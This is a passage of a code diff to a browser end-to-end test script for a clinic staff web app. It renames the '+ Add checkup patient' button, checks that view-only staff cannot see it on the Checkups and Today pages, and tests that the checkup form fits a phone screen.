-  assert.equal(await pm.getByRole('button', { name: '+ Add checkup' }).count(), 0);
+  assert.equal(await pm.getByRole('button', { name: '+ Add checkup patient' }).count(), 0);
+  await pm.goto(BASE + '#/staff/today');
+  await pm.waitForSelector('.stat');
+  assert.equal(await pm.locator('section.today-checkup').count(), 0, 'no checkup button on the Today page either');
 });
 
 
@@ -2107,7 +2269,12 @@ await step('Checkups page for a person who may only view: no add, edit or regist
   await loginAs(pa, 'Accountant');
   await pa.goto(BASE + '#/staff/checkups');
   await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
-  assert.equal(await pa.getByRole('button', { name: '+ Add checkup' }).count(), 0);
+  assert.equal(await pa.getByRole('button', { name: '+ Add checkup patient' }).count(), 0);
+  await pa.goto(BASE + '#/staff/today');
+  await pa.waitForSelector('.stat');
+  assert.equal(await pa.getByRole('button', { name: '+ Add checkup patient' }).count(), 0, 'nor on the Today page (it needs "Add and edit Aaj ki List entries")');
+  await pa.goto(BASE + '#/staff/checkups');
+  await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
   assert.equal(await pa.locator('table.checkup-table').getByRole('button', { name: /^(Register|Edit) / }).count(), 0);
   assert.ok(await pa.locator('table.checkup-table tbody tr[data-id]').first().locator('select[aria-label^="Follow-up status for"]').isDisabled());
   assert.ok(await pa.locator('table.checkup-table tbody tr[data-id]').first().locator('input[aria-label^="Notes for"]').isDisabled());
@@ -2163,7 +2330,21 @@ await step('phone: the Checkups page has a row on the first screen (More filters
   await pp.goto(BASE + '#/staff/sheet');
   await pp.waitForSelector('.add-panel:not([hidden])');
   const hint = (await pp.locator('.add-panel-text .muted').innerText()).trim();
-  assert.equal(hint, 'New and starting treatment? Use "+ New walk-in" (gets an Mr#). Only a checkup? Use "+ Checkup patient" (no Mr#).');
+  assert.equal(hint, 'New and starting treatment? Use "+ New walk-in" (gets an Mr#). Only a checkup? Use "+ Add checkup patient" (no Mr#).');
+});
+await step('phone: the Today page button and the checkup form fit a 390 px screen', async () => {
+  await pp.setViewportSize({ width: 390, height: 844 });
+  await pp.goto(BASE + '#/staff/today');
+  await pp.locator('section.today-checkup').getByRole('button', { name: '+ Add checkup patient' }).click();
+  const m = pp.locator('.modal');
+  await m.waitFor();
+  await noSideScroll(pp);
+  assert.ok(await m.evaluate((el) => el.scrollWidth <= el.clientWidth + 1), 'the form does not scroll sideways');
+  const widths = await m.locator('.checkup-form > *').evaluateAll((els) => els.filter((e) => e.offsetParent).map((e) => Math.round(e.getBoundingClientRect().width)));
+  assert.ok(widths.every((w) => w === widths[0]), 'one question per line on a phone: ' + widths.join(','));
+  await shot(pp, '21-checkup-form-phone');
+  await pp.keyboard.press('Escape');
+  await pp.setViewportSize({ width: 375, height: 812 });
 });
 // ------------------------------------------------------------- Register needs both "Register new patients" and list editing
 await step('Register needs both "Register new patients" and list editing: with list editing off for a person the button is not offered, and the data layer says no', async () => {
